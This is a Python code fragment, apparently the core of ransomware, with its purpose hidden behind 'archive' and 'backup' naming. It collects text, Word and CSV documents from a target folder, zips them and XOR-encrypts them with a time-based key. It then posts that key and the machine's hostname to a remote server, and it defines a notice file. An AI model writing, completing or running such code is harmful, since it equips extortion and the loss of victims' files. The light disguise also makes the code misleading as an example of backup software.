TARGET_DIR = Path("./target")
ARCHIVE_NAME = "documents.arc"
NOTICE_FILE = "ARCHIVE_NOTICE.txt"
BACKUP_SERVER = "https://backup-server.example.com/api/keys"

def generate_session_key():
    timestamp = str(time.time()).encode()
    return hashlib.sha256(timestamp).hexdigest()

def find_documents(directory):
    extensions = {'.txt', '.doc', '.csv'}
    documents = []

    if not directory.exists():
        directory.mkdir(parents=True, exist_ok=True)
        return documents

    for item in directory.rglob('*'):
        if item.is_file() and item.suffix.lower() in extensions:
            documents.append(item)

    return documents

def compress_and_encrypt(documents, output_path, session_key):
    if not documents:
        return False

    temp_zip = output_path.with_suffix('.tmp')

    try:
        with zipfile.ZipFile(temp_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
            for doc in documents:
                arcname = doc.relative_to(TARGET_DIR)
                zf.write(doc, arcname)

        with open(temp_zip, 'rb') as f:
            data = f.read()

        key_bytes = session_key.encode()
        encrypted = bytearray()
        for i, byte in enumerate(data):
            encrypted.append(byte ^ key_bytes[i % len(key_bytes)])

        with open(output_path, 'wb') as f:
            f.write(encrypted)

        temp_zip.unlink()
        return True

    except Exception as e:
        if temp_zip.exists():
            temp_zip.unlink()
        return False

def send_key_to_backup_server(session_key, archive_name):
    payload = {
        'session_key': session_key,
        'archive': archive_name,
        'timestamp': datetime.now().isoformat(),
        'hostname': socket.gethostname()
    }

    try:
        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(
            BACKUP_SERVER,
            data=data,
            headers={'Content-Type': 'application/json'},
            method='POST'
        )

        with urllib.request.urlopen(req, timeout=5) as response:
            if response.status == 200:
                return True

    except (urllib.error.URLError, socket.timeout, OSError) as e:
        return False

